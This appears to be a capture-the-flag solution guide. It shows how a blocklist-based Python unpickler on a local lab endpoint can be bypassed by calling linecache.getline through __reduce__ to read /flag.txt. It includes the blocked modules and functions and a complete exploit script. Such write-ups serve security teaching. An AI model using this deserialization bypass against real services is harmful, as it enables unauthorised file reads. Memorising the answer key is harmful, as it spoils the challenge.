# A08 Hard: Solution Guide

### Vulnerability Analysis
The application's `RestrictedUnpickler` in `/pipeline/import` inspects requested modules and function names during deserialization:
1. Blocked modules: `{'os', 'subprocess', 'posix', 'sys', 'commands', 'pty', 'shutil', 'socket'}`
2. Blocked function names: `{'eval', 'exec', 'system', 'popen', 'spawn', 'compile', 'call', 'check_output', 'check_call'}`

While direct execution primitives such as `builtins.eval` or `os.system` are blocked, the deserializer still allows importing standard library modules outside the blocklist.

In Python, the `linecache` module contains a helper function `linecache.getline(filename, lineno)`. Because `linecache` is not in the blocked modules list and `getline` is not in the blocked function names list, it passes sandbox validation. When unpickled with arguments `('/flag.txt', 1)`, it directly reads and returns the flag string from the filesystem.

### Exploitation Steps
1. Define a class implementing `__reduce__` that invokes `linecache.getline('/flag.txt', 1)`:
   ```python
   import linecache

   class Exploit:
       def __reduce__(self):
           return (linecache.getline, ('/flag.txt', 1))
   ```
2. Serialize the instance using `pickle.dumps()` and encode to Base64.
3. Submit the token to `POST /pipeline/import`.
4. The server unpickles the object, executes `linecache.getline('/flag.txt', 1)`, and displays the returned flag string in the template output.

### Exploit Script
```python
import base64
import pickle
import linecache
import requests
import re

BASE_URL = "http://127.0.0.1:6024"

class Exploit:
    def __reduce__(self):
        return (linecache.getline, ('/flag.txt', 1))

# Generate serialized payload
payload_b64 = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')

# Send payload to import endpoint
resp = requests.post(f"{BASE_URL}/pipeline/import", data={"payload": payload_b64})

# Extract flag
flag = re.search(r"RTSA\{[^}]+\}", resp.text)
if flag:
    print(f"[+] Dynamic Flag: {flag.group(0)}")
else:
    print("[-] Flag not found in response.")
```
